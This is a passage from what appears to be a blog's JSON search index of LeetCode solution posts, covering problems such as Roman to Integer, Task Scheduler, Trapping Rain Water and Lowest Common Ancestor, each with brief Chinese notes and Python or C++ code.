by seven different symbols: I, V, X, L, C, D and M.\nSymbol ValueI 1V 5X 10L 50C 100D 500M 1000For example, 2 is written as II in Roman numeral, just two one's added together. 12 is written as XII, which is simply X + II. The number 27 is written as XXVII, which is XX + V + II.\nRoman numerals are usually written largest to smallest from left to right. However, the numeral for four is not IIII. Instead, the number four is written as IV. Because the one is before the five we subtract it making four. The same principle applies to the number nine, which is written as IX. There are six instances where subtraction is used:\nI can be placed before V (5) and X (10) to make 4 and 9. X can be placed before L (50) and C (100) to make 40 and 90. C can be placed before D (500) and M (1000) to make 400 and 900.Given a roman numeral, convert it to an integer.\nExample 1:\nInput: s = IIIOutput: 3Example 2:\nInput: s = IVOutput: 4Example 3:\nInput: s = IXOutput: 9Example 4:\nInput: s = LVIIIOutput: 58Explanation: L = 50, V= 5, III = 3.Example 5:\nInput: s = MCMXCIVOutput: 1994Explanation: M = 1000, CM = 900, XC = 90 and IV = 4. Constraints:\n1 \u003c= s.length \u003c= 15s contains only the characters ('I', 'V', 'X', 'L', 'C', 'D', 'M').It is guaranteed that s is a valid roman numeral in the range [1, 3999]. Sol class Solution: def romanToInt(self, s: str) -\u0026gt; int: tbl = {\u0026#34;I\u0026#34;:1 ,\u0026#34;V\u0026#34;:5 ,\u0026#34;X\u0026#34;:10 ,\u0026#34;L\u0026#34;: 50 , \u0026#34;C\u0026#34;: 100, \u0026#34;D\u0026#34;:500, \u0026#34;M\u0026#34;:1000} tbl2 = {\u0026#34;IV\u0026#34;:4 ,\u0026#34;IX\u0026#34;:9 ,\u0026#34;XL\u0026#34;: 40 , \u0026#34;XC\u0026#34;: 90, \u0026#34;CD\u0026#34;:400, \u0026#34;CM\u0026#34;:900} ret,i = 0,0 while i \u0026lt; len(s): if s[i:i+2] in tbl2: ret += tbl2[s[i:i+2]] i += 2 else: ret += tbl[s[i]] i += 1 return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-13-roman-to-integer/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e水\u003c/p\u003e","title":"leetcode-13 - Roman to Integer"},{"content":"動機 preorder的tree threading\nProblem Given the root of a binary tree, flatten the tree into a linked list:\nThe linked list should use the same TreeNode class where the right child pointer points to the next node in the list and the left child pointer is always null.The linked list should be in the same order as a pre-order traversal of the binary tree. Example 1:\nInput: root = [1,2,5,3,4,null,6]Output: [1,null,2,null,3,null,4,null,5,null,6]Example 2:\nInput: root = []Output: []Example 3:\nInput: root = [0]Output: [0] Constraints:\nThe number of nodes in the tree is in the range [0, 2000].-100 \u003c= Node.val \u003c= 100 Follow up: Can you flatten the tree in-place (with O(1) extra space)? Sol class Solution: def flatten(self, root: TreeNode) -\u0026gt; None: def pre(root,prev): if root: originRight = root.right pro = pre(root.left, root) ret = pre(originRight, pro) if prev: prev.left, prev.right = None, root # 目前最大的node if not pro and not ret: return root elif not pro or not ret: return [x for x in [pro,ret] if x][0] else: return ret else: return None pre(root, None) ","permalink":"https://littlebees.github.io/2021/07/leetcode-114-flatten-binary-tree-to-linked-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003epreorder的tree threading\u003c/p\u003e","title":"leetcode-114 - Flatten Binary Tree to Linked List"},{"content":"動機 以為要算所有組合數\u0026hellip;\nProblem Given a characters array tasks, representing the tasks a CPU needs to do, where each letter represents a different task. Tasks could be done in any order. Each task is done in one unit of time. For each unit of time, the CPU could complete either one task or just be idle.\nHowever, there is a non-negative integer n that represents the cooldown period between two same tasks (the same letter in the array), that is that there must be at least n units of time between any two same tasks.\nReturn the least number of units of times that the CPU will take to finish all the given tasks.\nExample 1:\nInput: tasks = [A,A,A,B,B,B], n = 2Output: 8Explanation: A -\u003e B -\u003e idle -\u003e A -\u003e B -\u003e idle -\u003e A -\u003e BThere is at least 2 units of time between any two same tasks.Example 2:\nInput: tasks = [A,A,A,B,B,B], n = 0Output: 6Explanation: On this case any permutation of size 6 would work since n = 0.[A,A,A,B,B,B][A,B,A,B,A,B][B,B,B,A,A,A]...And so on.Example 3:\nInput: tasks = [A,A,A,A,A,A,B,C,D,E,F,G], n = 2Output: 16Explanation: One possible solution isA -\u003e B -\u003e C -\u003e A -\u003e D -\u003e E -\u003e A -\u003e F -\u003e G -\u003e A -\u003e idle -\u003e idle -\u003e A -\u003e idle -\u003e idle -\u003e A Constraints:\n1 \u003c= task.length \u003c= 104tasks[i] is upper-case English letter.The integer n is in the range [0, 100]. Sol: queue 就是直接塞到queue，queue的大小就是n，一直從最多任務的開始挑\nclass Solution: def leastInterval(self, tasks: List[str], n: int) -\u0026gt; int: q = deque() inQ = set() count = {} times = len(tasks) ret = 0 for (k,v) in dict(Counter(tasks)).items(): if v in count: count[v].add(k) else: count[v] = set([k]) while count: #print(count) nextTask = None index = None for k in sorted(count.keys(),reverse=True): for key in count[k]: if key not in inQ: nextTask = key break if nextTask: index = k break if nextTask: count[index].remove(nextTask) if not count[index]: del count[index] if index-1 \u0026gt; 0: if index-1 not in count: count[index-1] = set() count[index-1].add(nextTask) q.append(nextTask) inQ.add(nextTask) else: q.append(\u0026#39;idle\u0026#39;) if len(q) \u0026gt; n: task = q.popleft() if task != \u0026#39;idle\u0026#39;: inQ.remove(task) #print(q,heap) ret += 1 return ret Sol 先統計task的個數，找task最多出現幾次(mx)，這樣就會分出總共有幾組，因為最多的task一定會留到最後一組卻塞不滿，這樣就會有mx-1組\nmx = 3 A__ A__ A 接著算一組可以塞多少個，每一組都有一個最多的task，所以剩下的n個空格，不管有沒有都要留，因此每一組可以塞n+1個\nmx = 3 n = 2 A _ _ A _ _ A 最後就是塞不滿的總數有多少，就是看最多的task有幾種\nmx = 3 n = 2 rest = 1 A _ _ A _ _ A =\u0026gt; (mx-1) * (n+1) + rest 但要注意，如果任務總數比算出來的數字少，最少就是要任務總數的時間\n但我們只是要求時間長度，所以我們假設最多的task加上多的格子(要等的時間，所以我們可以塞別的task)可以塞完其他task，如果塞不完?\n就一定要整條跑完，因為n沒得塞\n最後就是\n(n+1): 要等的時間+最多的task一個 (mx-1): 最多的task的task數量減一，成為(n+1)的個數 rest: 最多的task的總數，最後一定會剩下最多的task等著去做\nclass Solution: def leastInterval(self, tasks: List[str], n: int) -\u0026gt; int: # 假設最後剩下來的task是最多的task，如果其他task多到漫出來，就是全跑 ts = Counter(tasks) mx = ts.most_common(1)[0][1] # task數 rest = Counter(ts.values())[mx] # 最多task的task的數量 return max(len(tasks), (n+1)*(mx-1)+rest) ","permalink":"https://littlebees.github.io/2021/07/leetcode-621-task-scheduler/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e以為要算所有組合數\u0026hellip;\u003c/p\u003e","title":"leetcode-621 - Task Scheduler"},{"content":"動機 複習bfs\nProblem Given the root of a binary tree, imagine yourself standing on the right side of it, return the values of the nodes you can see ordered from top to bottom.\nExample 1:\nInput: root = [1,2,3,null,5,null,4]Output: [1,3,4]Example 2:\nInput: root = [1,null,3]Output: [1,3]Example 3:\nInput: root = []Output: [] Constraints:\nThe number of nodes in the tree is in the range [0, 100].-100 \u003c= Node.val \u003c= 100 Sol bfs看每一level的最後一個\nclass Solution: def rightSideView(self, root: TreeNode) -\u0026gt; List[int]: if not root: return [] ret,q = [], deque([[root]]) while q: rs = q.popleft() ret.append(rs[-1].val) rs = sum([[x for x in [r.left, r.right] if x] for r in rs if r],[]) if rs: q.append(rs) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-199-binary-tree-right-side-view/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習bfs\u003c/p\u003e","title":"leetcode-199 - Binary Tree Right Side View"},{"content":"動機 當成range，就可以去二分了\nProblem Given an integer n, return the number of structurally unique BST's (binary search trees) which has exactly n nodes of unique values from 1 to n.\nExample 1:\nInput: n = 3Output: 5Example 2:\nInput: n = 1Output: 1 Constraints:\n1 \u003c= n \u003c= 19 Sol 分成左右兩邊，如果範圍長度只有1就是一個node，非法範圍就是沒node，但這兩個都是一個組合數\nclass Solution: def numTrees(self, n: int) -\u0026gt; int: @cache def dp(i,j): if i \u0026gt;= j or j-i == 1: # single node or empty node return 1 else: return sum([dp(i,k) * dp(k+1,j) for k in range(i,j)]) return dp(1,n+1) ","permalink":"https://littlebees.github.io/2021/07/leetcode-96-unique-binary-search-trees/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當成range，就可以去二分了\u003c/p\u003e","title":"leetcode-96 - Unique Binary Search Trees"},{"content":"動機 設計dp時，要注意到return的東西要可以被接\nProblem Given an m x n binary matrix filled with 0's and 1's, find the largest square containing only 1's and return its area.\nExample 1:\nInput: matrix = [[1,0,1,0,0],[1,0,1,1,1],[1,1,1,1,1],[1,0,0,1,0]]Output: 4Example 2:\nInput: matrix = [[0,1],[1,0]]Output: 1Example 3:\nInput: matrix = [[0]]Output: 0 Constraints:\nm == matrix.lengthn == matrix[i].length1 \u003c= m, n \u003c= 300matrix[i][j] is '0' or '1'. Sol 設計dp時，要注意到return的東西要可以被接\n像這裡就不要回傳面積，回傳邊長可以算出面積，面積同時也不好組合 所以這裡dp是回傳該點在右下角時的最大正方形邊長\nclass Solution: def maximalSquare(self, ms: List[List[str]]) -\u0026gt; int: @cache def dp(i,j): if i \u0026lt; 0 or i \u0026gt;= len(ms) or j \u0026lt; 0 or j \u0026gt;= len(ms[0]) or ms[i][j] == \u0026#34;0\u0026#34;: return 0 elif any([dp(i-1,j) == 0, dp(i,j-1) == 0, dp(i-1,j-1) == 0]): return 1 else: left, up, dia = dp(i-1,j), dp(i,j-1), dp(i-1,j-1) return min(left,up,dia)+1 return max([max([dp(i,j) for j in range(len(ms[0]))]) for i in range(len(ms))])**2 ","permalink":"https://littlebees.github.io/2021/07/leetcode-221-maximal-square/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e設計dp時，要注意到return的東西要可以被接\u003c/p\u003e","title":"leetcode-221 - Maximal Square"},{"content":"動機 樹型dp 用sum(list of list,[])去攤平一層\nProblem The thief has found himself a new place for his thievery again. There is only one entrance to this area, called root.\nBesides the root, each house has one and only one parent house. After a tour, the smart thief realized that all houses in this place form a binary tree. It will automatically contact the police if two directly-linked houses were broken into on the same night.\nGiven the root of the binary tree, return the maximum amount of money the thief can rob without alerting the police.\nExample 1:\nInput: root = [3,2,3,null,3,null,1]Output: 7Explanation: Maximum amount of money the thief can rob = 3 + 3 + 1 = 7.Example 2:\nInput: root = [3,4,5,1,3,null,1]Output: 9Explanation: Maximum amount of money the thief can rob = 4 + 5 = 9. Constraints:\nThe number of nodes in the tree is in the range [1, 104].0 \u003c= Node.val \u003c= 104 Sol class Solution: @cache def rob(self, r: TreeNode) -\u0026gt; int: if not r: return 0 else: childs = [r.left,r.right] grands = sum([[x.left if x else None, x.right if x else None] for x in childs],[]) return max(r.val+sum([self.rob(h) for h in grands]), sum([self.rob(h) for h in childs])) ","permalink":"https://littlebees.github.io/2021/07/leetcode-337-house-robber-iii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e樹型dp\n用\u003ccode\u003esum(list of list,[])\u003c/code\u003e去攤平一層\u003c/p\u003e","title":"leetcode-337 - House Robber III"},{"content":"動機 不是所有括號都要遞迴\nProblem Given an encoded string, return its decoded string.\nThe encoding rule is: k[encoded_string], where the encoded_string inside the square brackets is being repeated exactly k times. Note that k is guaranteed to be a positive integer.\nYou may assume that the input string is always valid; No extra white spaces, square brackets are well-formed, etc.\nFurthermore, you may assume that the original data does not contain any digits and that digits are only for those repeat numbers, k. For example, there won't be input like 3a or 2[4].\nExample 1:\nInput: s = 3[a]2[bc]Output: aaabcbcExample 2:\nInput: s = 3[a2[c]]Output: accaccaccExample 3:\nInput: s = 2[abc]3[cd]efOutput: abcabccdcdcdefExample 4:\nInput: s = abc3[cd]xyzOutput: abccdcdcdxyz Constraints:\n1 \u003c= s.length \u003c= 30s consists of lowercase English letters, digits, and square brackets '[]'.s is guaranteed to be a valid input.All the integers in s are in the range [1, 300]. Sol 括號就直接用loop去找\nclass Solution: def decodeString(self, s: str) -\u0026gt; str: i,j=0,0 if not s: return \u0026#34;\u0026#34; elif s[i].isdigit(): while j \u0026lt; len(s) and s[j].isdigit(): j += 1 times = int(s[i:j]) i,j,others = j+1, j+1,0 while j \u0026lt; len(s) and (s[j] != \u0026#39;]\u0026#39; or others \u0026gt; 0): if s[j] == \u0026#39;[\u0026#39;: others += 1 elif s[j] == \u0026#39;]\u0026#39;: others -= 1 j += 1 #print(times, s[i:j], s[j+1:]) return times*self.decodeString(s[i:j])+self.decodeString(s[j+1:]) else: return s[i]+self.decodeString(s[i+1:]) ","permalink":"https://littlebees.github.io/2021/07/leetcode-394-decode-string/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e不是所有括號都要遞迴\u003c/p\u003e","title":"leetcode-394 - Decode String"},{"content":"動機 原來是prefix sum的靈壓!!\nProblem Given the root of a binary tree and an integer targetSum, return the number of paths where the sum of the values along the path equals targetSum.\nThe path does not need to start or end at the root or a leaf, but it must go downwards (i.e., traveling only from parent nodes to child nodes).\nExample 1:\nInput: root = [10,5,-3,3,2,null,11,3,-2,null,1], targetSum = 8Output: 3Explanation: The paths that sum to 8 are shown.Example 2:\nInput: root = [5,4,8,11,null,13,4,7,2,null,null,5,1], targetSum = 22Output: 3 Constraints:\nThe number of nodes in the tree is in the range [0, 1000].-109 \u003c= Node.val \u003c= 109-1000 \u003c= targetSum \u003c= 1000 Sol 最簡單一個走一個找\nclass Solution: def pathSum(self, root: TreeNode, val: int) -\u0026gt; int: def count(r,acc): if not r: return 0 elif acc+r.val == val: ret = 1 else: ret = 0 ret += count(r.left,acc+r.val)+count(r.right,acc+r.val) return ret def dfs(r): if not r: return 0 else: return count(r,0)+dfs(r.left)+dfs(r.right) return dfs(root) 或是善用prefix sum，不過這是tree，所以要在遞迴離開之前要把原本的sum註銷掉\nclass Solution: def pathSum(self, root: TreeNode, targetSum: int) -\u0026gt; int: sums = defaultdict(int) sums[0] = 1 ret = 0 def dfs(r,cnt): nonlocal ret if not r: return else: cnt += r.val ret += sums[cnt - targetSum] # targetSum = sums[a:b] = sums[b](cnt) - sums[a] sums[cnt] += 1 dfs(r.left, cnt) dfs(r.right, cnt) sums[cnt] -= 1 # 離開之前要把原本的sum註銷掉 dfs(root,0) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-437-path-sum-iii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e原來是prefix sum的靈壓!!\u003c/p\u003e","title":"leetcode-437 - Path Sum III"},{"content":"動機 當你對遞迴有懷疑就上cache\nProblem You are given an integer array nums and an integer target.\nYou want to build an expression out of nums by adding one of the symbols '+' and '-' before each integer in nums and then concatenate all the integers.\nFor example, if nums = [2, 1], you can add a '+' before 2 and a '-' before 1 and concatenate them to build the expression +2-1.Return the number of different expressions that you can build, which evaluates to target.\nExample 1:\nInput: nums = [1,1,1,1,1], target = 3Output: 5Explanation: There are 5 ways to assign symbols to make the sum of nums be target 3.-1 + 1 + 1 + 1 + 1 = 3+1 - 1 + 1 + 1 + 1 = 3+1 + 1 - 1 + 1 + 1 = 3+1 + 1 + 1 - 1 + 1 = 3+1 + 1 + 1 + 1 - 1 = 3Example 2:\nInput: nums = [1], target = 1Output: 1 Constraints:\n1 \u003c= nums.length \u003c= 200 \u003c= nums[i] \u003c= 10000 \u003c= sum(nums[i]) \u003c= 1000-1000 \u003c= target \u003c= 1000 Sol class Solution: def findTargetSumWays(self, nums: List[int], target: int) -\u0026gt; int: @cache def bt(i,acc): if i == len(nums): return 1 if acc == target else 0 else: return sum([bt(i+1,acc+nums[i]), bt(i+1,acc-nums[i])]) return bt(0,0) ","permalink":"https://littlebees.github.io/2021/07/leetcode-494-target-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e當你對遞迴有懷疑就上cache\u003c/p\u003e","title":"leetcode-494 - Target Sum"},{"content":"動機 複習dp\nProblem Given a m x n grid filled with non-negative numbers, find a path from top left to bottom right, which minimizes the sum of all numbers along its path.\nNote: You can only move either down or right at any point in time.\nExample 1:\nInput: grid = [[1,3,1],[1,5,1],[4,2,1]]Output: 7Explanation: Because the path 1 → 3 → 1 → 1 → 1 minimizes the sum.Example 2:\nInput: grid = [[1,2,3],[4,5,6]]Output: 12 Constraints:\nm == grid.lengthn == grid[i].length1 \u003c= m, n \u003c= 2000 \u003c= grid[i][j] \u003c= 100 Sol class Solution: def minPathSum(self, grid: List[List[int]]) -\u0026gt; int: @cache def dp(i,j): if i == 0 and j == 0: return grid[i][j] elif i \u0026lt; 0 or i \u0026gt;= len(grid) or j \u0026lt; 0 or j \u0026gt;= len(grid[i]): return float(\u0026#39;inf\u0026#39;) else: return min(dp(i-1,j),dp(i,j-1))+grid[i][j] return dp(len(grid)-1,len(grid[0])-1) ","permalink":"https://littlebees.github.io/2021/07/leetcode-64-minimum-path-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習dp\u003c/p\u003e","title":"leetcode-64 - Minimum Path Sum"},{"content":"動機 每次看經典題與他的解答都是新的發現\n這邊居然有dp 與 two pointer\nProblem Given n non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it can trap after raining.\nExample 1:\nInput: height = [0,1,0,2,1,0,1,3,2,1,2,1]Output: 6Explanation: The above elevation map (black section) is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped.Example 2:\nInput: height = [4,2,0,3,2,5]Output: 9 Constraints:\nn == height.length1 \u003c= n \u003c= 2 * 1040 \u003c= height[i] \u003c= 105 Sol 一個會看到只要後面有更高的就可以把前面比較矮的給忽略掉，所以可以用stack存高到矮的牆，等高的出現，就可以一直pop算每一層的水\nclass Solution: def trap(self, hs: List[int]) -\u0026gt; int: stk = [] #premise: hs[stk[0]] \u0026gt; hs[stk[any i which is \u0026gt; 0]] ret = 0 for i in range(len(hs)): if stk: if hs[stk[-1]] \u0026lt; hs[i]: base_height = hs[stk.pop()] # pop bottom while stk and hs[stk[-1]] \u0026lt;= hs[i]: ret += (i-stk[-1]-1)*(min(hs[stk[-1]],hs[i])-base_height) base_height = hs[stk.pop()] if stk: ret += (i-stk[-1]-1)*(min(hs[stk[-1]],hs[i])-base_height) elif hs[stk[-1]] == hs[i]: stk.pop() stk.append(i) #print(i,stk,ret) return ret 或者是看成柱子一路長高的過程，再走的時候記下柱子與目前最高的差距\nclass Solution: def trap(self, hs: List[int]) -\u0026gt; int: a,b,ret = 0,len(hs)-1,0 leftH, rightH = 0,0 while a \u0026lt; b: if hs[a] \u0026lt; hs[b]: if hs[a] \u0026gt;= leftH: leftH = hs[a] else: ret += leftH-hs[a] a += 1 else: if hs[b] \u0026gt;= rightH: rightH = hs[b] else: ret += rightH-hs[b] b -= 1 return ret 但也不用兩邊都算，因為我們只要取最小的就好，所以只要累計左右最小的那一邊就好，如此一來就可以兩邊輪流算!! 就變成two pointer\nclass Solution: def trap(self, hs: List[int]) -\u0026gt; int: a,b,ret = 0,len(hs)-1,0 leftH, rightH = 0,0 while a \u0026lt; b: if hs[a] \u0026lt; hs[b]: if hs[a] \u0026gt;= leftH: leftH = hs[a] else: ret += leftH-hs[a] a += 1 else: if hs[b] \u0026gt;= rightH: rightH = hs[b] else: ret += rightH-hs[b] b -= 1 return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-42-trapping-rain-water/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e每次看經典題與他的解答都是新的發現\u003c/p\u003e\n\u003cp\u003e這邊居然有dp 與 two pointer\u003c/p\u003e","title":"leetcode-42 - Trapping Rain Water"},{"content":"動機 題目很賤，但賤的心服口服\nreverse原來這麼泛用嗎?!\nProblem Given an array, rotate the array to the right by k steps, where k is non-negative.\nExample 1:\nInput: nums = [1,2,3,4,5,6,7], k = 3Output: [5,6,7,1,2,3,4]Explanation:rotate 1 steps to the right: [7,1,2,3,4,5,6]rotate 2 steps to the right: [6,7,1,2,3,4,5]rotate 3 steps to the right: [5,6,7,1,2,3,4]Example 2:\nInput: nums = [-1,-100,3,99], k = 2Output: [3,99,-1,-100]Explanation: rotate 1 steps to the right: [99,-1,-100,3]rotate 2 steps to the right: [3,99,-1,-100] Constraints:\n1 \u003c= nums.length \u003c= 105-231 \u003c= nums[i] \u003c= 231 - 10 \u003c= k \u003c= 105 Follow up:\nTry to come up with as many solutions as you can. There are at least three different ways to solve this problem.Could you do it in-place with O(1) extra space? Sol 如果老實的一個一個rotate，就會TLE\n一個是Cyclic replace，就一直往前跳，直到再次回到起點\nclass Solution: def rotate(self, nums: List[int], k: int) -\u0026gt; None: k = k % len(nums) changed,i = 0,0 while changed \u0026lt; len(nums): start,source = i, nums[i] while True: nextI = (start+k) % len(nums) nums[nextI], source = source, nums[nextI] start, changed = nextI, changed+1 if start == i: break i += 1 還有另一個是reverse\n先整個reverse，再reverse要rotate的個數\nclass Solution: def rotate(self, nums: List[int], k: int) -\u0026gt; None: k = k % len(nums) def rev(ns,i,j): while i \u0026lt; j: ns[i], ns[j-1] = ns[j-1], ns[i] i,j = i+1, j-1 rev(nums,0,len(nums)) rev(nums,0,k) rev(nums,k,len(nums)) ","permalink":"https://littlebees.github.io/2021/07/leetcode-189-rotate-array/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e題目很賤，但賤的心服口服\u003c/p\u003e\n\u003cp\u003ereverse原來這麼泛用嗎?!\u003c/p\u003e","title":"leetcode-189 - Rotate Array"},{"content":"動機 我忘了localty\nProblem Given a binary tree, find the lowest common ancestor (LCA) of two given nodes in the tree.\nAccording to the definition of LCA on Wikipedia: “The lowest common ancestor is defined between two nodes p and q as the lowest node in T that has both p and q as descendants (where we allow a node to be a descendant of itself).”\nExample 1:\nInput: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 1Output: 3Explanation: The LCA of nodes 5 and 1 is 3.Example 2:\nInput: root = [3,5,1,6,2,0,8,null,null,7,4], p = 5, q = 4Output: 5Explanation: The LCA of nodes 5 and 4 is 5, since a node can be a descendant of itself according to the LCA definition.Example 3:\nInput: root = [1,2], p = 1, q = 2Output: 1 Constraints:\nThe number of nodes in the tree is in the range [2, 105].-109 \u003c= Node.val \u003c= 109All Node.val are unique.p != qp and q will exist in the tree. Sol 原本是用bfs，放node與到root的path，之後做intersection\nclass Solution: def lowestCommonAncestor(self, root: \u0026#39;TreeNode\u0026#39;, p: \u0026#39;TreeNode\u0026#39;, q: \u0026#39;TreeNode\u0026#39;) -\u0026gt; \u0026#39;TreeNode\u0026#39;: pchain, qchain = None, None qu = deque([[root,[root]]]) # root, path to root while not pchain or not qchain: r, path = qu.popleft() pchain = path if not pchain and p is r else pchain qchain = path if not qchain and q is r else qchain for x in [x for x in [r.left,r.right] if x]: qu.append([x,path[::]+[x]]) if len(pchain) != len(qchain): a,b = min([pchain,qchain], key=lambda x: len(x)), max([pchain,qchain], key=lambda x: len(x)) while len(b) \u0026gt; len(a): if b[-1] is a[-1]: return b[-1] else: b.pop() else: a,b = pchain,qchain while a[-1] is not b[-1]: a.pop() b.pop() return a[-1] 但是如果用dfs可以一次檢查兩個ptr，但是要用global去存第一個祖先\nclass Solution: def lowestCommonAncestor(self, root: \u0026#39;TreeNode\u0026#39;, p: \u0026#39;TreeNode\u0026#39;, q: \u0026#39;TreeNode\u0026#39;) -\u0026gt; \u0026#39;TreeNode\u0026#39;: if not root: return None lca = None def dfs(r): nonlocal lca if not r: return False, False else: isp,isq = (r is p), (r is q) if not isp or not isq: a,b = dfs(r.left) x,y = dfs(r.right) isp, isq = (isp or a or x), (isq or b or y) if not lca and isp and isq: lca = r return isp,isq dfs(root) return lca 這題保證p,q一定在tree中，這樣就只要dfs到p,q，之後只要回程檢查有沒有一個root是同時看到p,q的就是LCA 沒有看到就會是null\nclass Solution { public: TreeNode* lowestCommonAncestor(TreeNode* root, TreeNode* p, TreeNode* q) { if (!root || root == p || root == q) return root; else { auto l = lowestCommonAncestor(root-\u0026gt;left, p, q), r = lowestCommonAncestor(root-\u0026gt;right, p, q); if (l \u0026amp;\u0026amp; r) // 這裡就是LCA return root; else if (l) // 一定在其中一邊 return l; else return r; } } }; ","permalink":"https://littlebees.github.io/2021/07/leetcode-236-lowest-common-ancestor-of-a-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e我忘了localty\u003c/p\u003e","title":"leetcode-236 - Lowest Common Ancestor of a Binary Tree"},{"content":"動機 有點像287一直換的解法，但後面還可以擴充成two pointer去夾\nProblem Given an array nums with n objects colored red, white, or blue, sort them in-place so that objects of the same color are adjacent, with the colors in the order red, white, and blue.\nWe will use the integers 0, 1, and 2 to represent the color red, white, and blue, respectively.\nYou must solve this problem without using the library's sort function.\nExample 1:\nInput: nums = [2,0,2,1,1,0]Output: [0,0,1,1,2,2]Example 2:\nInput: nums = [2,0,1]Output: [0,1,2]Example 3:\nInput: nums = [0]Output: [0]Example 4:\nInput: nums = [1]Output: [1] Constraints:\nn == nums.length1 \u003c= n \u003c= 300nums[i] is 0, 1, or 2. Follow up: Could you come up with a one-pass algorithm using only constant extra space?\nSol 從最小的color開始，往pos的位置換\nclass Solution: def sortColors(self, nums: List[int]) -\u0026gt; None: pos,color = 0,0 while pos \u0026lt; len(nums): for i in range(pos,len(nums)): if nums[i] == color: nums[i], nums[pos] = nums[pos], nums[i] pos += 1 color += 1 上面只有看一邊，因為只有三個顏色，所以可以放兩個ptr一個看最小，一個看最大\n但要注意，如果是從最大的換過來的，還要再檢查一次，因為最大的range中可能有比他小的像0或是1\nclass Solution: def sortColors(self, nums: List[int]) -\u0026gt; None: left,right,cur = 0,len(nums)-1,0 while cur \u0026lt;= right: if nums[cur] == 0: nums[cur], nums[left] = nums[left], nums[cur] left += 1 elif nums[cur] == 2: nums[cur], nums[right] = nums[right], nums[cur] right -= 1 cur -= 1 # 再檢查一次 cur += 1 ","permalink":"https://littlebees.github.io/2021/07/leetcode-75-sort-colors/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e有點像\u003ca href=\"/2021/07/leetcode-287\"\u003e287\u003c/a\u003e一直換的解法，但後面還可以擴充成two pointer去夾\u003c/p\u003e","title":"leetcode-75 - Sort Colors"},{"content":"動機 要自己處理32位整數的溢位\nProblem Given a signed 32-bit integer x, return x with its digits reversed. If reversing x causes the value to go outside the signed 32-bit integer range [-231, 231 - 1], then return 0.\nAssume the environment does not allow you to store 64-bit integers (signed or unsigned).\nExample 1:\nInput: x = 123Output: 321Example 2:\nInput: x = -123Output: -321Example 3:\nInput: x = 120Output: 21Example 4:\nInput: x = 0Output: 0 Constraints:\n-231 \u003c= x \u003c= 231 - 1 Sol class Solution: def reverse(self, x: int) -\u0026gt; int: ret,minus,x,cons = 0,(x\u0026lt;0),abs(x),2**31 while x != 0: ret += (x%10) ret, x = ret*10, x//10 ret = ret//10 ret = -ret if minus else ret return ret if -cons \u0026lt;= ret \u0026lt;= cons-1 else 0 ","permalink":"https://littlebees.github.io/2021/07/leetcode-7-reverse-integer/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e要自己處理32位整數的溢位\u003c/p\u003e","title":"leetcode-7 - Reverse Integer"},{"content":"動機 複習Counter與認識一個神奇的算法\nProblem Given an array nums of size n, return the majority element.\nThe majority element is the element that appears more than ⌊n / 2⌋ times. You may assume that the majority element always exists in the array.\nExample 1:\nInput: nums = [3,2,3]Output: 3Example 2:\nInput: nums = [2,2,1,1,1,2,2]Output: 2 Constraints:\nn == nums.length1 \u003c= n \u003c= 5 * 104-231 \u003c= nums[i] \u003c= 231 - 1 Follow-up: Could you solve the problem in linear time and in O(1) space? Sol class Solution: def majorityElement(self, nums: List[int]) -\u0026gt; int: return Counter(nums).most_common(1)[0][0] 因為majority element會超過一半，所以會有連續的值 所以可以用一個counter紀錄連續相同的值，只要count等於0就換成現在的人\ncounter只會大於等於0的正數\nclass Solution: def majorityElement(self, nums): count = 0 candidate = None for num in nums: if count == 0: candidate = num count += (1 if num == candidate else -1) return candidate ","permalink":"https://littlebees.github.io/2021/07/leetcode-169-majority-element/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e複習Counter與認識一個神奇的算法\u003c/p\u003e","title":"leetcode-169 - Majority Element"},{"content":"動機 中序的英文是inorder，一開始寫以為是前序\nProblem Given the root of a binary tree, return the inorder traversal of its nodes' values.\nExample 1:\nInput: root = [1,null,2,3]Output: [1,3,2]Example 2:\nInput: root = []Output: []Example 3:\nInput: root = [1]Output: [1]Example 4:\nInput: root = [1,2]Output: [2,1]Example 5:\nInput: root = [1,null,2]Output: [1,2] Constraints:\nThe number of nodes in the tree is in the range [0, 100].-100 \u003c= Node.val \u003c= 100 Follow up: Recursive solution is trivial, could you do it iteratively? Sol class Solution: def inorderTraversal(self, root: TreeNode) -\u0026gt; List[int]: ret = [] def dfs(r): if r: dfs(r.left) ret.append(r.val) dfs(r.right) dfs(root) return ret ","permalink":"https://littlebees.github.io/2021/07/leetcode-94-binary-tree-inorder-traversal/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e中序的英文是inorder，一開始寫以為是前序\u003c/p\u003e","title":"leetcode-94 - Binary Tree Inorder Traversal"},{"content":"動機 